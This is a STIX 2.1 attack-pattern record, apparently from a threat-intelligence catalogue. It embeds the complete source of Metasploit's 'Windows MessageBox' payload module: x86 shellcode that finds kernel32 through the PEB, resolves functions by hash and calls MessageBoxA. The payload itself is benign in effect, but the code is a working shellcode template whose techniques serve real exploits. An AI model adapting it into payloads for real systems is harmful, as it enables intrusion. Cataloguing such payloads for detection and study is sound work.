{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2606703-17d6-4a4e-9503-d4374e0235fc",
    "created": "2024-08-14T16:33:19.367582Z",
    "modified": "2024-08-14T16:33:19.367586Z",
    "name": "Windows MessageBox",
    "description": "Spawns a dialog via MessageBox using a customizable title, text & icon",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/windows/messagebox.rb",
            "external_id": "messagebox.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 272\n\n  include Msf::Payload::Windows\n  include Msf::Payload::Single\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Windows MessageBox',\n      'Description'   => 'Spawns a dialog via MessageBox using a customizable title, text & icon',\n      'Author'        =>\n        [\n          'corelanc0d3r <peter.ve[at]corelan.be>', # original payload module\n          'jduck'         # some ruby factoring\n        ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'win',\n      'Arch'          => ARCH_X86\n    ))\n\n    # Register MessageBox options\n    register_options(\n      [\n        OptString.new('TITLE', [ true, \"Messagebox Title (max 255 chars)\", \"MessageBox\" ], max_length: 255),\n        OptString.new('TEXT', [ true, \"Messagebox Text (max 255 chars)\", \"Hello, from MSF!\" ], max_length: 255),\n        OptString.new('ICON', [ true, \"Icon type can be NO, ERROR, INFORMATION, WARNING or QUESTION\", \"NO\" ])\n      ])\n  end\n\n  #\n  # Construct the payload\n  #\n  def generate(_opts = {})\n\n    strTitle = datastore['TITLE'] + \"X\"\n    if (strTitle.length < 1)\n      raise ArgumentError, \"You must specify a title\"\n    end\n\n    strText = datastore['TEXT'] + \"X\"\n    if (strText.length < 1)\n      raise ArgumentError, \"You must specify the text of the MessageBox\"\n    end\n\n    # exitfunc process or thread ?\n    stackspace = \"0x04\"\n    funchash = \"\"\n    doexitseh = \"\"\n    case datastore['EXITFUNC'].upcase.strip\n    when 'PROCESS'\n      stackspace = \"0x08\"\n      funchash = \"0x73E2D87E\"\n    when 'THREAD'\n      stackspace = \"0x08\"\n      funchash = \"0x60E0CEEF\"\n    end\n\n    # create exit routine for process / thread\n    getexitfunc = <<EOS\n  ;base address of kernel32 will be at esp,\n  mov ebx,#{funchash}\n  xchg ebx, dword [esp]\n  push edx\n  call find_function\n  ;store function address at ebx+08\n  mov [ebp+0x8],eax\nEOS\n\n    doexit = <<EOS\n  xor eax,eax\t\t;zero out eax\n  push eax\t\t;put 0 on stack\n  call [ebp+8]\t;ExitProcess/Thread(0)\nEOS\n\n    # if exit is set to seh or none, overrule\n    if datastore['EXITFUNC'].upcase.strip == \"SEH\"\n      # routine to exit via exception\n      doexit = <<EOS\n  xor eax,eax\n  call eax\nEOS\n      getexitfunc = ''\n    elsif datastore['EXITFUNC'].upcase.strip == \"NONE\"\n      doexit = <<-EOS\n      nop\n      EOS\n      getexitfunc = ''\n    end\n\n    # Generate code to get ptr to Title\n    marker_idx = strTitle.length - 1\n    strPushTitle = string_to_pushes(strTitle, marker_idx)\n    # generate code to write null byte\n    strWriteTitleNull = \"xor ebx,ebx\\n\\tmov [esp+0x#{marker_idx.to_s(16)}],bl\\n\\tmov ebx,esp\\n\\t\"\n\n    #================Process Text===============================\n    marker_idx = strText.length - 1\n    strPushText = string_to_pushes(strText, marker_idx)\n    strWriteTextNull = \"xor ecx,ecx\\n\\tmov [esp+0x#{marker_idx.to_s(16)}],cl\\n\\tmov ecx,esp\\n\\t\"\n\n    # generate code to set messagebox icon\n    setstyle = \"push edx\\n\\t\"\n    case datastore['ICON'].upcase.strip\n      #default = NO\n    when 'ERROR'\n      setstyle = \"push 0x10\\n\\t\"\n    when 'QUESTION'\n      setstyle = \"push 0x20\\n\\t\"\n    when 'WARNING'\n      setstyle = \"push 0x30\\n\\t\"\n    when 'INFORMATION'\n      setstyle = \"push 0x40\\n\\t\"\n    end\n\n    #create actual payload\n    payload_data = <<EOS\n  ;getpc routine\n  fldpi\n  fstenv [esp-0xc]\n  xor edx,edx\n  mov dl,0x77\t;offset to start_main\n\n;get kernel32\n  xor ecx,ecx\n  mov esi, [fs:ecx + 0x30]\n  mov esi, [esi + 0x0C]\n  mov esi, [esi + 0x1C]\nnext_module:\n  mov eax, [esi + 0x08]\n  mov edi, [esi + 0x20]\n  mov esi, [esi]\n  cmp [edi + 12*2], cl\n  jne next_module\n\n  pop ecx\n  add ecx,edx\n  jmp ecx            ;jmp start_main\n\nfind_function:\n  pushad\t\t\t\t;save all registers\n  mov ebp, [esp  +  0x24]\t;put base address of module that is being loaded in ebp\n  mov eax, [ebp  +  0x3c]\t;skip over MSDOS header\n  mov edx, [ebp  +  eax  +  0x78]\t;go to export table and put relative address in edx\n  add edx, ebp\t\t\t;add base address to it.\n            ;edx = absolute address of export table\n  mov ecx, [edx  +  0x18]\t\t;set up counter ECX\n            ;(how many exported items are in array ?)\n  mov ebx, [edx  +  0x20]\t\t;put names table relative offset in ebx\n  add ebx, ebp\t\t\t;add base address to it.\n            ;ebx = absolute address of names table\n\nfind_function_loop:\n  jecxz  find_function_finished ;if ecx=0, then last symbol has been checked.\n            ;(should never happen)\n            ;unless function could not be found\n  dec ecx\t\t\t\t;ecx=ecx-1\n  mov esi,  [ebx  +  ecx  *  4]\t;get relative offset of the name associated\n            ;with the current symbol\n            ;and store offset in esi\n  add esi,  ebp\t\t\t;add base address.\n            ;esi = absolute address of current symbol\n\ncompute_hash:\n  xor edi,  edi\t\t\t;zero out edi\n  xor eax,  eax\t\t\t;zero out eax\n  cld\t\t\t\t\t;clear direction flag.\n            ;will make sure that it increments instead of\n            ;decrements when using lods*\n\ncompute_hash_again:\n  lodsb\t\t\t\t\t;load bytes at esi (current symbol name)\n            ;into al, + increment esi\n  test al, al\t\t\t\t;bitwise test :\n            ;see if end of string has been reached\n  jz  compute_hash_finished\t;if zero flag is set = end of string reached\n  ror edi,  0xd\t\t\t;if zero flag is not set, rotate current\n            ;value of hash 13 bits to the right\n  add edi, eax\t\t\t;add current character of symbol name\n            ;to hash accumulator\n  jmp compute_hash_again\t\t;continue loop\n\ncompute_hash_finished:\n\nfind_function_compare:\n  cmp edi,  [esp  +  0x28]\t;see if computed hash matches requested hash\n            ; (at esp+0x28)\n            ;edi = current computed hash\n            ;esi = current function name (string)\n  jnz find_function_loop\t\t;no match, go to next symbol\n  mov ebx,  [edx  +  0x24]\t;if match : extract ordinals table\n            ;relative offset and put in ebx\n  add ebx,  ebp\t\t\t;add base address.\n            ;ebx = absolute address of ordinals address table\n  mov cx,  [ebx  +  2  *  ecx]\t;get current symbol ordinal number (2 bytes)\n  mov ebx,  [edx  +  0x1c]\t;get address table relative and put in ebx\n  add ebx,  ebp\t\t\t;add base address.\n            ;ebx = absolute address of address table\n  mov eax,  [ebx  +  4  *  ecx]\t;get relative function offset from its ordinal\n            ;and put in eax\n  add eax,  ebp\t\t\t;add base address.\n            ;eax = absolute address of function address\n  mov [esp  +  0x1c],  eax\t;overwrite stack copy of eax so popad\n            ;will return function address in eax\nfind_function_finished:\n  popad \t\t\t\t;restore original registers.\n            ;eax will contain function address\n  ret\n\nstart_main:\n  mov dl,#{stackspace}\n  sub esp,edx\t\t;allocate space on stack\n  mov ebp,esp\t\t;set ebp as frame ptr for relative offset\n  mov edx,eax\t\t;save base address of kernel32 in edx\n\n  push 0xEC0E4E8E\t;get LoadLibrary function ptr\n  push edx\n  call find_function\n  ;put function address on stack (ebx+04)\n  mov [ebp+0x4],eax\n  #{getexitfunc}\t\t;optionally get selected exit function ptr\n\n  ;put pointer to string user32.dll to stack\n  push 0x41206c6c\n  push 0x642e3233\n  push 0x72657375    \t;user32.dll\n  xor bl,bl           ;make sure we have a null byte\n  mov [esp+0xA],bl\t\t;null byte\n  mov esi,esp\t\t\t;put pointer to string on top of stack\n  push esi\n  call [ebp+0x4]\t\t;call LoadLibrary\n  ; base address of user32.dll is now in eax (if loaded correctly)\n  mov edx,eax\t\t\t;put ptr in edx\n  push eax\t\t\t;put it on stack as well\n  ;find the MessageBoxA function\n  mov ebx, 0xBC4DA2A8\n  xchg ebx, dword [esp]  ;esp = base address of user32.dll\n  push edx\n  call find_function\n  ;function address should be in eax now\n  ;we'll keep it there\n  ;get pointer to title\n  #{strPushTitle}\n  #{strWriteTitleNull}\t;ebx will point to title\n  ;get pointer to text\n  #{strPushText}\n  #{strWriteTextNull}\t;ecx will point to text\n\n;now push parameters to the stack\n  xor edx,edx\t\t;zero out edx\n  #{setstyle}\t\t;set button/iconstyle on stack\n  push ebx\t\t;put pointer to Title on stack\n  push ecx\t\t;put pointer to Text on stack\n  push edx\t\t;put 0 on stack (hWnd)\n  call eax\t\t;call MessageBoxA(hWnd,Text,Title,Style)\n\n;EXITFUNC\n  #{doexit}\nEOS\n    self.assembly = payload_data\n    super\n  end\n\n  #\n  # Turn the provided string into a serious of pushes\n  #\n  def string_to_pushes(str, marker_idx)\n    # Align string to 4 bytes\n    rem = (marker_idx+1) % 4\n    if (rem > 0)\n      str << \" \" * (4 - rem)\n    end\n\n    # string is now 4 byte aligned and ends with 'X' at index 'marker_idx'\n\n    # push string to stack, starting at the back\n    pushes = ''\n    while (str.length > 0)\n      four = str.slice!(-4, 4)\n      dw = four.unpack('V').first\n      pushes << \"push 0x%x\\n\\t\" % dw\n    end\n\n    pushes\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}